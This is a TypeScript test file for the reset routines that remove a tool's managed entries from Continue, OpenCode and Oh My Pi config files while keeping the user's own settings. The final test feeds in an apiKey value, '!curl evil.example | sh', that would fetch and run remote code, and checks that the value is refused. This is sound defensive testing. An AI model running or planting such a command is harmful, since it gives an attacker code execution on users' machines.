/**
 * Reset for the guide-based tools: Continue, OpenCode, and Oh My Pi.
 *
 * All three write into a file the user already owns — Continue's other assistants,
 * opencode's plugins and MCP servers, omp's other providers and model roles. Reset
 * therefore has to remove the managed entries in place; deleting the file, or clearing a
 * key the user has since pointed elsewhere, would take their configuration with it.
 */
import test from "node:test";
import assert from "node:assert/strict";

const { applyRoutiformContinueConfig, removeRoutiformContinueConfig } =
  await import("../../src/shared/services/continueConfig.ts");
const { mergeOpenCodeConfig, removeRoutiformOpenCodeConfig } =
  await import("../../src/shared/services/opencodeConfig.ts");
const {
  applyRoutiformOmpModels,
  applyRoutiformOmpSettings,
  removeRoutiformOmpModels,
  removeRoutiformOmpSettings,
  hasRoutiformOmpConfig,
} = await import("../../src/shared/services/ompConfig.ts");

const BASE_URL = "http://127.0.0.1:20128/v1";
const LOCAL_HOSTS = ["localhost:20128", "127.0.0.1:20128"];

test("Continue: apply then reset leaves no managed model behind", () => {
  const applied = applyRoutiformContinueConfig(null, { baseUrl: BASE_URL, model: "cx/gpt-5.4" });
  const reset = removeRoutiformContinueConfig(applied, { localHosts: LOCAL_HOSTS });

  assert.deepEqual(reset.models, []);
});

test("Continue: the user's own models and assistant identity survive", () => {
  const existing = {
    name: "my-assistant",
    version: "1.2.0",
    schema: "v1",
    models: [{ name: "local", provider: "ollama", model: "qwen3", apiBase: "http://host:11434" }],
  };
  const applied = applyRoutiformContinueConfig(existing, {
    baseUrl: BASE_URL,
    model: "cx/gpt-5.4",
  });
  const reset = removeRoutiformContinueConfig(applied, { localHosts: LOCAL_HOSTS });

  assert.equal(reset.models.length, 1);
  assert.equal(reset.models[0].provider, "ollama");
  assert.equal(reset.name, "my-assistant");
  assert.equal(reset.schema, "v1");
});

test("Continue: an entry written before the managed flag is still cleaned up", () => {
  const legacy = { models: [{ title: "old", model: "cx/gpt-5.4", apiBase: BASE_URL }] };
  const reset = removeRoutiformContinueConfig(legacy, { localHosts: LOCAL_HOSTS });

  assert.deepEqual(reset.models, []);
});

test("Continue: resetting a config that was never applied to is a no-op", () => {
  assert.deepEqual(removeRoutiformContinueConfig({}, { localHosts: LOCAL_HOSTS }), {});
  assert.deepEqual(removeRoutiformContinueConfig(null, { localHosts: LOCAL_HOSTS }), {});
});

test("OpenCode: apply then reset removes both managed providers and the default model", () => {
  const applied = mergeOpenCodeConfig(null, {
    baseUrl: BASE_URL,
    apiKey: "sk_live",
    model: "cx/gpt-5.4",
    models: ["cx/gpt-5.4", "cc/claude-sonnet-5"],
  });
  assert.ok(applied.provider["routiform-openai"], "fixture must actually apply something");

  const reset = removeRoutiformOpenCodeConfig(applied);
  assert.equal(reset.provider, undefined, "an empty provider map is dropped, not left behind");
  assert.equal(reset.model, undefined);
});

test("OpenCode: the user's providers, plugins and MCP servers are untouched", () => {
  const existing = {
    plugin: ["opencode-antigravity-auth@latest"],
    mcp: { git: { type: "local", command: ["uvx", "mcp-server-git"] } },
    provider: { custom: { name: "Custom Provider" } },
  };
  const applied = mergeOpenCodeConfig(existing, { baseUrl: BASE_URL, model: "cx/gpt-5.4" });
  const reset = removeRoutiformOpenCodeConfig(applied);

  assert.deepEqual(reset.provider, { custom: { name: "Custom Provider" } });
  assert.deepEqual(reset.plugin, ["opencode-antigravity-auth@latest"]);
  assert.ok(reset.mcp.git);
});

test("OpenCode: the legacy provider key is cleaned up too", () => {
  const reset = removeRoutiformOpenCodeConfig({ provider: { routiform: { name: "Legacy" } } });
  assert.equal(reset.provider, undefined);
});

test("OpenCode: a model the user has since switched to is left alone", () => {
  const applied = mergeOpenCodeConfig(null, { baseUrl: BASE_URL, model: "cx/gpt-5.4" });
  const switched = { ...applied, model: "anthropic/claude-sonnet-5" };
  const reset = removeRoutiformOpenCodeConfig(switched);

  assert.equal(reset.model, "anthropic/claude-sonnet-5");
});

test("OpenCode: resetting a config that was never applied to is a no-op", () => {
  assert.deepEqual(removeRoutiformOpenCodeConfig({ model: "anthropic/claude-sonnet-5" }), {
    model: "anthropic/claude-sonnet-5",
  });
  assert.deepEqual(removeRoutiformOpenCodeConfig(null), {});
});

const OMP_INPUT = { baseUrl: `${BASE_URL}/`, apiKey: "sk_routiform", model: "cx/gpt-5.4" };

test("Oh My Pi: apply writes one provider whose base URL has no trailing slash", () => {
  const applied = applyRoutiformOmpModels(null, OMP_INPUT);

  assert.deepEqual(Object.keys(applied.providers), ["routiform"]);
  assert.equal(applied.providers.routiform.baseUrl, BASE_URL);
  assert.equal(applied.providers.routiform.api, "openai-completions");
  assert.deepEqual(applied.providers.routiform.models, [{ id: "cx/gpt-5.4", name: "cx/gpt-5.4" }]);
});

test("Oh My Pi: token limits are written only when known", () => {
  const applied = applyRoutiformOmpModels(null, {
    ...OMP_INPUT,
    models: ["cx/gpt-5.4", "cc/opus"],
    contextLengths: { "cx/gpt-5.4": 400000 },
    maxOutputTokens: { "cx/gpt-5.4": 0 },
  });

  const [first, second] = applied.providers.routiform.models;
  assert.equal(first.contextWindow, 400000);
  // omp rejects a non-positive limit, so an unknown one is omitted rather than zeroed.
  assert.equal("maxTokens" in first, false);
  assert.deepEqual(second, { id: "cc/opus", name: "cc/opus" });
});

test("Oh My Pi: apply then reset restores the file byte-for-byte", () => {
  const existing = {
    providers: {
      spark: { baseUrl: "http://192.168.10.223:8000/v1", api: "openai-completions" },
    },
  };
  const applied = applyRoutiformOmpModels(existing, OMP_INPUT);
  assert.equal(hasRoutiformOmpConfig(applied), true);

  const reset = removeRoutiformOmpModels(applied);
  assert.equal(hasRoutiformOmpConfig(reset), false);
  assert.deepEqual(reset, existing);
});

test("Oh My Pi: an emptied provider map is dropped, not left as an empty key", () => {
  // `providers` is the only root key omp's schema accepts, and an empty one is not valid.
  assert.deepEqual(removeRoutiformOmpModels(applyRoutiformOmpModels(null, OMP_INPUT)), {});
  assert.deepEqual(removeRoutiformOmpModels(null), {});
});

test("Oh My Pi: reset clears the default role but keeps the roles pointing elsewhere", () => {
  const existing = {
    modelRoles: { smol: "anthropic/claude-haiku-4-5" },
    disabledProviders: ["groq"],
  };
  const applied = applyRoutiformOmpSettings(existing, "cx/gpt-5.4");
  assert.equal(applied.modelRoles.default, "routiform/cx/gpt-5.4");

  const reset = removeRoutiformOmpSettings(applied);
  assert.deepEqual(reset, existing);
});

test("Oh My Pi: a default role the user has since switched to is left alone", () => {
  const switched = { modelRoles: { default: "anthropic/claude-sonnet-5" } };
  assert.deepEqual(removeRoutiformOmpSettings(switched), switched);
});

test("Oh My Pi: an apiKey omp would run as a shell command is refused", () => {
  // omp resolves a `!`-prefixed apiKey by executing it and using stdout, so letting one
  // through would turn a config save into stored command execution on the next omp run.
  assert.throws(
    () => applyRoutiformOmpModels(null, { ...OMP_INPUT, apiKey: "!curl evil.example | sh" }),
    /shell command/
  );
  // The keys this app actually issues are unaffected.
  assert.doesNotThrow(() =>
    applyRoutiformOmpModels(null, { ...OMP_INPUT, apiKey: "sk-abc123-1-9f2a" })
  );
});
